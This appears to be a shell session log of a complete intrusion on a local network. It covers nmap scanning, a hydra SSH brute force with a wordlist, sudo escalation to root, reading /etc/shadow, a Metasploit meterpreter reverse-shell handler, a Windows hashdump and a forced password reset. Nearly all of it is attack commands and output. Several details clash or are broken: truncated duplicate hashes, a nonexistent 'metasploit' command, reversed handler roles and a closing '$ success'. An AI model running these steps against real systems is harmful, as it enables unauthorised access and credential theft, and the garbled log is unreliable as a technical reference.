$ sudo nmap -sP 192.168.1.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-16 15:25 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0010s latency).
MAC Address: 00:14:22:01:23:45 (Unknown)
Nmap scan report for 192.168.1.2
Host is up (0.0008s latency).
MAC Address: 00:0C:29:48:55:9E (VMware, Inc.)

$ sudo nmap -sV -p 1-65535 192.168.1.2
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-16 15:27 UTC
Nmap scan report for 192.168.1.2
Host is up (0.00068s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
443/tcp  open  ssl/https   OpenSSL/1.1.1
3306/tcp open  mysql       MySQL 5.7.30
MAC Address: 00:0C:29:48:55:9E (VMware, Inc.)

$ ssh 192.168.1.2
The authenticity of host '192.168.1.2 (192.168.1.2)' can't be established.
ECDSA key fingerprint is SHA256:0Nhtn3kzL1NcvA/k+jN0U8Pd9A6UhoABpJo1akUljn8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.2' (ECDSA) to the list of known hosts.
user@192.168.1.2's password:
Permission denied, please try again.
user@192.168.1.2's password:

$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.1.2 ssh
Hydra v8.6 (c) 2024 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 0 login tries (l:1/p:0), ~0 tries per task
[DATA] attacking ssh://192.168.1.2:22/
[22][ssh] host: 192.168.1.2   login: user   password: password123
1 of 1 target successfully completed, 1 valid password found

$ ssh user@192.168.1.2
user@192.168.1.2's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
User user may run the following commands on this host:
    (ALL : ALL) ALL

$ sudo su
root@192.168.1.2:~# cd /var/www/html
root@192.168.1.2:/var/www/html# ls
index.html
root@192.168.1.2:/var/www/html# nano index.html

root@192.168.1.2:/var/www/html# service apache2 restart
 * Restarting web server apache2
root@192.168.1.2:/var/www/html# cd /root
root@192.168.1.2:~# ls
root@192.168.1.2:~# cat /etc/shadow
root:$6$7bsGk92e$ZyFzl5kF2KD39.Y/YTkZk9z/:18277:0:99999:7:::
user:$6$7bsGk92e$ZyFzl5kF2KD39.Y/YTkZk9z/:18277:0:99999:7:::
root@192.168.1.2:~# nano /etc/passwd
root@192.168.1.2:~# exit
$ logout
Connection to 192.168.1.2 closed.
$ ssh user@192.168.1.2
user@192.168.1.2's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
$ sudo su
root@192.168.1.2:~# whoami
root
root@192.168.1.2:~# apt-get update
root@192.168.1.2:~# apt-get upgrade
root@192.168.1.2:~# apt-get install netcat
root@192.168.1.2:~# nc -lvp 4444
listening on [any] 4444 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.3] 5555
root@192.168.1.2:~# uname -a
Linux 192.168.1.2 4.15.0-20-generic #21-Ubuntu SMP
root@192.168.1.2:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.2  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 00:0c:29:48:55:9e  txqueuelen 1000  (Ethernet)
        RX packets 12345  bytes 9876543 (9.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12345  bytes 9876543 (9.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@192.168.1.2:~# ping -c 4 google.com
PING google.com (142.250.74.110) 56(84) bytes of data.
64 bytes from iad23s63-in-f14.1e100.net (142.250.74.110): icmp_seq=1 ttl=117 time=9.94 ms
64 bytes from iad23s63-in-f14.1e100.net (142.250.74.110): icmp_seq=2 ttl=117 time=9.94 ms
64 bytes from iad23s63-in-f14.1e100.net (142.250.74.110): icmp_seq=3 ttl=117 time=9.94 ms
64 bytes from iad23s63-in-f14.1e100.net (142.250.74.110): icmp_seq=4 ttl=117 time=9.94 ms

--- google.com ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3000ms
rtt min/avg/max/mdev = 9.940/9.940/9.940/0.000 ms

root@192.168.1.2:~# vi /etc/hosts
127.0.0.1   localhost
127.0.1.1   user-VirtualBox
192.168.1.2 mytarget.local
root@192.168.1.2:~# exit
$ logout
Connection to 192.168.1.2 closed.

$ metasploit
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.2
LHOST => 192.168.1.2
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.1.2:4444
[*] Sending stage (179779 bytes) to 192.168.1.3
[*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.3:5555)

meterpreter > sysinfo
Computer        : 192.168.1.3
OS              : Windows 10 (Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
meterpreter > hashdump
Administrator:500:5f4dcc3b5aa765d61d8327deb882cf99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:::
user:1001:5f4dcc3b5aa765d61d8327deb882cf99:::
meterpreter > migrate 1234
[*] Migrating from 1234 to 5678...
[*] Migration completed successfully.
meterpreter > shell
Process 5678 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19042.1052]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32> net user
User accounts for \\192.168.1.3
----------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount       user
The command completed successfully.

C:\Windows\system32> net user user password123
The command completed successfully.

C:\Windows\system32> exit
meterpreter > exit
[*] Shutting down Meterpreter...

msf exploit(handler) > exit
$ success
